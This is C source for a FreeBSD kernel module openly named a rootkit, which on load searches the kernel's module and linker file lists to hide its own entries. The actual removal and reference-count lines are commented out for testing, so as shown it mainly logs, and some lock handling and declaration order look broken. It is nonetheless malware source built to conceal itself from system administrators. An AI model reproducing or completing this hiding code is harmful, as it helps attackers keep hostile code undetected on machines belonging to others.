/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "config.h"
#include "debug.h"

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>

#include "detect.h"

static int
load(struct module *module, int cmd, void *arg)
{
        switch(cmd) {
        case MOD_LOAD:
                LOGI("[rootkit:load] Rootkit loaded.\n");
                remove_linker_file("rootkit.ko");
				remove_module_from_kernel("rootkit");
				break;
        case MOD_UNLOAD:
                LOGI("[rootkit:load] Rootkit unloaded.\n");
                break;
        default:
                LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
                break;
        }

        return(0);
}

static moduledata_t rootkit_mod = {
        MODULE_NAME,
        load,
        NULL
};

static int remove_module_from_kernel(char * name){
	struct module * mod;
	int result = 1;
	sx_xlock(&modules_sx);
	
	LOGI("Searching for %s in modules\n", name);
	TAILQ_FOREACH(mod, &modules, link){
		//LOGI("Checking Module: %s\n", mod->name);
		if(strcmp(mod->name, name) == 0 ){
			LOGI("Found %s, Removing from modules list", mod->name);
			//nextid--;
			//TAILQ_REMOVE(&modules, mod, link);
			result = 0;
			break;
		}
	}

	sx_xunlock(&modules_sx);
	return result;
}

// Uncommented to make testing eaiser
static int remove_linker_file(char * name){
	struct linker_file  *lf;
	int result = 1;

	mtx_lock(&Giant);
	sx_slock(&kld_sx);
	//decrement_kernel_image_ref_count();

	LOGI("Attempting to remove linker file %s\n", name);
	TAILQ_FOREACH(lf, &linker_files, link){
		LOGI("Checking %s\n", lf->filename);
		if(strcmp(lf->filename, name) == 0){
			//next_file_id--;
			//TAILQ_REMOVE(&linker_files,lf,link);
			LOGI("Found and removing linker file\n");
			result = 0;
			break;
		}
	}

	sx_unlock(&kld_sx);
	mtx_unlock(&Giant);
	return result;
}

static void decrement_kernel_image_ref_count(void){
	(&linker_files)->tqh_first->refs--;
}

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
